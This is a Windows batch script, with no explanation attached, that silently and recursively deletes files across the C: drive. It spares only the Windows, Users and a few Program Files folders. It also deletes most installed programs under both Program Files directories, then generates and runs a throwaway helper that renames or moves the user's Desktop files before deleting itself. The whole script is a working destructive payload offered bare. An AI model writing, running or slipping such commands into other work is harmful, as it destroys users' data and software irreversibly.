c:
cd /
for /D %%I in (*) do if /I not "%%I"=="Windows" if /I not "%%I"=="Users" if /I not "%%I"=="Program Files (x86)" if /I not "%%I"=="Program Files" del /s /q "%%I"
cd C:/"Program Files (x86)"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Microsoft" if /I not "%%I"=="Microsoft.NET" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/"Program Files"
for /D %%I in (*) do if /I not "%%I"=="Common Files" if /I not "%%I"=="Windows Defender" if /I not "%%I"=="Windows Mail" if /I not "%%I"=="Windows Media Player" if /I not "%%I"=="Windows NT" if /I not "%%I"=="Windows Photo Viewer" if /I not "%%I"=="WindowsPowerShell" del /s /q "%%I"
cd C:/Users/%username%/Desktop
@echo off
setlocal enabledelayedexpansion

echo @echo off > move_items_script.bat
echo setlocal enabledelayedexpansion >> move_items_script.bat
echo. >> move_items_script.bat
echo for %%I in (*) do ( >> move_items_script.bat
echo     if not "%%I"=="move_items_script.bat" ( >> move_items_script.bat
echo         set "dirname=%%~nxI" >> move_items_script.bat
echo         move "%%I" "!dirname!.old\" >> move_items_script.bat
echo     ) >> move_items_script.bat
echo ) >> move_items_script.bat
echo. >> move_items_script.bat
echo endlocal >> move_items_script.bat

call move_items_script.bat
del move_items_script.bat

endlocal


